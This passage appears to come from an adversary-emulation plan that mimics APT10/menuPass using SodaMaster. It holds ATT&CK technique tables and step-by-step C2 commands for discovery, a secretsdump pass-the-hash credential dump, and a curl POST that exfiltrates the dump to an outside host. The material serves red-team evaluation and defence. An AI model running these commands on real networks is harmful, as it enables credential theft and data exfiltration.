<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=The%20layer%20I%20loader%20decrypts%20the%20layer%20II%20loader%20shellcode%20from%20the%20embedded%20data" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SigLoader reflectively loads and executes SodaMaster</td>
<td><a href="../../resources/sigloader/src/layer1_loader.cpp#L75">run_code</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:%7E:text=modified%20P8RAT%20accordingly.-,SodaMaster,-Another%20payload%20of" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster uses stackstrings for obfuscation</td>
<td><a href="../../resources/sodamaster/#stackstrings">StackStrings documentation</a></td>
<td>T1027 Obfuscated Files or Information</td>
<td><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster uses native APIs</td>
<td><a href="../resources/sodamaster/sodamaster-dll">SodaMaster</a></td>
<td>T1106 Native API</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster collects username via GetUserName API</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L62">GetCurrentUserName</a></td>
<td>T1033 System Owner/User Discovery</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster collects hostname via GetComputerNameA API</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L41">GetCurrentComputerName</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster collects processor architecture and build information via GetSystemInfo and GetProductInfo APIs</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L113">GetSMSysInfo</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster checks Model-Specific Register range used by hypervisors (anti-vm)</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/avm.cpp#L155">MSRCheck</a></td>
<td>T1497.001 System Checks</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster checks number of CPU cores is not 1 via GetSysInfo API (anti-vm)</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/avm.cpp#L31">CheckProcCount</a></td>
<td>T1497.001 System Checks</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster checks running processes via CreateToolhelp32Snapshot API (anti-vm)</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/avm.cpp#L57">CheckVMProcess</a></td>
<td>T1497.001 System Checks</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster checks registry via RegOpenKeyEx API (anti-vm)</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/avm.cpp#L126">RegistryCheck</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster checks expected time between sleeps (anti-vm)</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/avm.cpp#L11">CheckExpectedTime</a></td>
<td>T1497.003 Time Based Evasion</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes PowerShell via CreateProcess API</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L349">ExecutePowerShellCmd</a></td>
<td>T1059.001 Command and Scripting Interpreter: PowerShell</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster adds itself to Defender&#x27;s whitelist via Add-MpPreference</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L298">defenderWhitelist</a></td>
<td>T1562.001 Impair Defenses: Disable or Modify Tools</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster communicates over TCP</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/comslib.cpp#L172">SendData</a></td>
<td>T1095 Non-Application Layer Protocol</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>
<doc-anchor-target id="step-8---discovery-and-additional-privilege-escalation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-8---discovery-and-additional-privilege-escalation">#</doc-anchor-trigger>
        <span>Step 8 - Discovery and Additional Privilege Escalation</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="voice-track">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
    </h3>
</doc-anchor-target>
<p>menuPass uses SodaMaster to execute discovery actions, which will result in
menuPass discovering a file server <code v-pre>alphamon (10.20.10.23)</code> and its
administrator <code v-pre>kmimi</code> on Subsidiary B’s network. SodaMaster creates threads for
executing downloaded shellcode in memory.</p>
<p>To prepare to laterally move onto the file server, menuPass uses SodaMaster to
download <code v-pre>secretsdump.exe</code>, which is Impacket&#x27;s <code v-pre>secretsdump.py</code> converted to
an executable binary using PyInstaller. SodaMaster executes <code v-pre>secretsdump.exe</code>
to dump the SYSTEM/SECURITY/SAM hives on the bastion workstation <code v-pre>kimeramon (10.20.20.11)</code>,
authenticating using the NTLM hash for <code v-pre>kizumi.da</code> collected
previously.</p>
<p>The retrieved dump contains a cached domain login for <code v-pre>kmimi</code>, the file
server administrator in Subsidiary B which is cracked to reveal <code v-pre>kmimi</code>&#x27;s
plaintext password.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Using SodaMaster, execute the discovery actions shellcode. <strong>Wait until each command has returned before executing the next.</strong></p>
<ul>
<li><p><code v-pre>netstat -anop tcp</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;args&quot;:&quot;netstat -anop tcp&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify a network connection to <code v-pre>alphamon (10.20.10.23)</code> port 445</li>
</ul>
</li>
<li><p><code v-pre>tasklist /v</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;args&quot;:&quot;tasklist /v&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify that the enumerated processes output contains a process running under <code v-pre>kmimi</code></li>
</ul>
</li>
<li><p><code v-pre>net view 10.20.10.23 /all</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;args&quot;:&quot;net view 10.20.10.23 /all&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify the output contains a list of file shares with the file server host <code v-pre>alphamon (10.20.10.23)</code></li>
</ul>
</li>
<li><p><code v-pre>net user kmimi /domain</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;args&quot;:&quot;net user kmimi /domain&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify that <code v-pre>File Server Admins</code> is listed as one of the groups that <code v-pre>kmimi</code> is a member of</li>
</ul>
</li>
</ul>
</li>
<li><p>Using SodaMaster, download and execute <code v-pre>secretsdump.exe</code>, using the NTLM hash for <code v-pre>kizumi.da</code>
collected in step 5</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;payload&quot;:&quot;secretsdump.exe&quot;, &quot;payloadPath&quot;:&quot;C:/Windows/Temp&quot;, &quot;args&quot;:&quot;C:/Windows/Temp/secretsdump.exe digirunaway/kizumi.da@127.0.0.1 -hashes :6265fbabbdaa3ee71df61bd9f3c77d68 &gt; C:/Windows/Temp/tmp4541 &amp;&amp; echo Done&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Using SodaMaster, curl the secretsdump output to exfiltrate the file</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task 2ef436e5400781c2f6611c31d4ef79b8 '{&quot;id&quot;:&quot;s&quot;, &quot;args&quot;:&quot;curl -X POST -H 'filename:sdump.txt' --data-binary @C:/Windows/Temp/tmp4541 http://ten-cent.us/uploads&quot;}'</code></pre>
</doc-codeblock></div>
</li>
<li><p>Confirm secretsdump output file was exfiltrated in the C2 server log then check for presence of a cached domain login for <code v-pre>kmimi</code> in the output:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cat files/sdump.txt | grep -a kmimi</code></pre>
</doc-codeblock></div>
</li>
</ul>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> This hash is cracked to retrieve the plaintext password
for <code v-pre>kmimi</code></p>
</blockquote>
<doc-anchor-target id="reference-code-reporting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-code-reporting">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F50D;</span> Reference Code &amp; Reporting</span>
    </h3>
</doc-anchor-target>
<ol>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/">https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/</a></li>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf">http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf</a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf">https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf</a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html">https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html</a></li>
<li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks</a></li>
<li><a href="https://cycraft.com/download/Smokescreen_Supply_Chain_Attack_Targets_Taiwan_Financial_Sector_A_Deeper_Look.pdf">https://cycraft.com/download/Smokescreen_Supply_Chain_Attack_Targets_Taiwan_Financial_Sector_A_Deeper_Look.pdf</a></li>
</ol>
 <details>
   <summary>:link: Click to expand source code links table</summary>
<blockquote>
<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> <strong>NOTE:</strong> Not all techniques listed in this table
directly map to evaluation substeps</p>
</blockquote>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Red Team Activity</th>
<th>Source Code Link</th>
<th>ATT&amp;CK Technique</th>
<th>Relevant CTI Report</th>
</tr>
</thead>
<tbody>
<tr>
<td>SodaMaster execute commands via sRDI</td>
<td><a href="../../resources/sodamaster/sodamaster-dll/core.cpp#L196">ExecShellcode</a></td>
<td>T1620 Reflective Code Loading</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes <code v-pre>netstat -anop tcp</code></td>
<td>-</td>
<td>T1049 System Network Connections Discovery</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes <code v-pre>tasklist /v</code></td>
<td>-</td>
<td>T1057 Process Discovery</td>
<td><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>SodaMaster executes <code v-pre>net view 10.20.10.23 /all</code></td>
<td>-</td>
<td>T1135 Network Share Discovery</td>
